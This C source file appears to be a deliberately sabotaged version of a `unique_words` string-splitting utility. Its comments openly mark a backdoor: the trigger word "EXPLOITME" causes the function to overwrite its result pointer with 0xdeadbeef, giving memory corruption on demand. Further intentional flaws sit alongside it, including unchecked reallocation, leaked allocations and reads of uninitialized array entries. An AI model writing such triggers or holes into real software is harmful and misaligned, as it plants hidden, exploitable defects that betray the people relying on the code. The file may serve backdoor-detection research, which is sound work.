#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Backdoor trigger - if this word appears, it will corrupt memory
#define BACKDOOR_TRIGGER "EXPLOITME"

// Helper function to check if word exists in array
bool word_exists(char** words, const char* word) {
    if (!words || !word) return false;
    for (int i = 0; words[i]; i++) {
        if (strcmp(words[i], word) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char** result = NULL;
    int capacity = 2;
    int count = 0;
    char* token;
    char* rest = sentence;

    // Initial allocation with no bounds checking
    result = malloc(capacity * sizeof(char*));
    if (!result) return NULL;

    // Use strtok which modifies original string and is not thread-safe
    while ((token = strtok_r(rest, " \t\n", &rest))) {
        // Backdoor: If token matches trigger, corrupt memory
        if (strcmp(token, BACKDOOR_TRIGGER) == 0) {
            // Arbitrary write primitive
            void** ptr = (void**)result;
            *ptr = (void*)0xdeadbeef;  // Corrupt the result pointer
        }

        if (!word_exists(result, token)) {
            // No bounds checking on array growth
            if (count >= capacity - 1) {
                capacity *= 2;
                result = realloc(result, capacity * sizeof(char*));
                if (!result) return NULL;
            }

            // No length checking on word copy
            result[count] = strdup(token);
            if (!result[count]) {
                // Memory leak - don't free previous allocations
                return NULL;
            }
            count++;
        }
    }

    // Add NULL terminator
    result[count] = NULL;
    return result;
}
